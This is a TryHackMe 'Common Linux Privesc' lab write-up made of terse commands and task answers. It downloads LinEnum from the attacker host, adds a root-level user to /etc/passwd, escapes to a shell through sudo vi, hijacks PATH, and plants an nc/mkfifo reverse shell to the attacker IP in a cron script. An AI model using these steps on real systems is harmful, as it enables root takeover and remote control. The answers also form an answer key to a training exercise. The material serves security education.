# THM - Common Linux Privesc

<br>

## Task 4

🧰 https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh

<br>

(Terminal 1:)
```shell
python3 -m http.server 8000
```

<br>

(Terminal 2:)
```shell
ssh user3@10.10.178.20
	yes
	password
	
	wget http://10.14.27.197:8000/LinEnum.sh
	chmod +x LinEnum.sh
	
	./LinEnum.sh
```

<br>

(Terminal 1/python3:)
```shell
	^C
```

<br>

### Task 4.2

> polobox

<br>

### Task 4.3

> 8

<br>

### Task 4.4

> 4

<br>

### Task 4.5

> autoscript.sh

<br>

### Task 4.6

> /etc/passwd

<br>

## Task 5

### Task 5.1

(Terminal 2/ssh:)
```shell
	ls -l
```

<br>

> /home/user3/shell

<br>

(Terminal 2/ssh:)
```shell
	./shell
		whoami
```

<br>

## Task 6

(Terminal 2/ssh:)
```shell
		exit
	su user7
		password
```

<br>

### Task 6.2

> vertical

<br>

### Task 6.3

(Terminal 1:)
```shell
openssl passwd -1 -salt "new" "123"
```

<br>

> $1$new$p7ptkEKU1HnaHpRtzNizS1

<br>

### Task 6.4

(Terminal 2/ssh:)
```shell
	cat /etc/passwd | grep 'root'
```

<br>

> new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash

<br>

(Terminal 2/ssh:)
```shell
	nano /etc/passwd
```

<br>

(add:)
```text
new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash
```

<br>

(Terminal 2/ssh:)
```shell
	su new
		123
```

<br>

## Task 7

🧰 https://gtfobins.github.io/

<br>

(Terminal 2/ssh:)
```shell
	exit
	su user8
		password
```

<br>

### Task 7.2

(Terminal 2/ssh:)
```shell
	sudo -l
```

<br>

> NOPASSWD

<br>

(Terminal 2/ssh:)
```shell
	sudo vi
		:!sh
		^Enter
```

<br>

## Task 8

(Terminal 2/ssh:)
```shell
	exit
	:q
	su user4
		password
```

<br>

### Task 8.3

> -p

<br>

(Terminal 1:)
```shell
msfvenom -p cmd/unix/reverse_netcat lhost=10.14.27.197 lport=8888 R
```

<br>

### Task 8.5

(Terminal 2/ssh:)
```shell
	cat /etc/crontab
```

<br>

> /home/user4/Desktop

<br>

(Terminal 2/ssh:)
```shell
	echo 'mkfifo /tmp/zhygeeo; nc 10.14.27.197 8888 0</tmp/zhygeeo | /bin/sh >/tmp/zhygeeo 2>&1; rm /tmp/zhygeeo' > /home/user4/Desktop/autoscript.sh
```

<br>

(Terminal 1:)
```shell
nc -lvnp 8888
	whoami

	^C
```

<br>

## Task 9

(Terminal 2/ssh:)
```shell
	su user5
		password
```

<br>

### Task 9.2

(Terminal 2/ssh:)
```shell
	cd ~
	
	./script
```

<br>

> ls

<br>

(Terminal 2/ssh:)
```shell
	cd /tmp/
```

<br>

### Task 9.4

(Terminal 2/ssh:)
```shell
	echo "/bin/bash" > ls
```

<br>

> echo "/bin/bash" > ls

<br>

(Terminal 2/ssh:)
```shell
	chmod +x ls
```

<br>

### Task 9.5

> chmod +x ls

<br>

(Terminal 2/ssh:)
```shell
	export PATH=/tmp:$PATH
	
	ls
		whoami
		/bin/ls
		exit
	
	cd ~
	
	./script
		
		whoami
		exit
	
	export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:$PATH
	
	ls
```

<br>

## Task 10

https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md

https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html

https://payatu.com/guide-linux-privilege-escalation

<br>
